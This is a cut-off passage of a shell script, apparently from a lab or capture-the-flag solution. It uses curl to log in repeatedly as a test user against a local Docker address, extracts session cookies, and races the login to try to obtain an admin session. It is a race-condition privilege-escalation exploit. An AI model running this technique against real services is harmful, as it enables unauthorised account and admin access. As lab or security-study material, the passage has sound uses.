                             sed 's/.*session=//;s/;.*//' | tr -d '             
                             \\n')\necho \"Test session:                        
                             $SESSION\"\n\n# Now, race the login to             
                             get an admin-level session:\n# Run 100             
                             login requests for test, each                      
                             immediately followed by admin_panel                
                             check\nrm -f /tmp/toctou2_*.txt\nfor i             
                             in $(seq 1 50); do\n  (\n                          
                             NEW_SESS=$(curl -s -X POST                         
                             http://172.17.0.1:40625/login -d                   
                             \"username=test&password=test\" -D -               
                             2>/dev/null | grep \"Set-Cookie\" |                
                             grep session | sed                                 
                             's/.*session=//;s/;.*//' | tr -d '                 
                             \\n')\n    if [ -n \"$NEW_SESS\" ];                
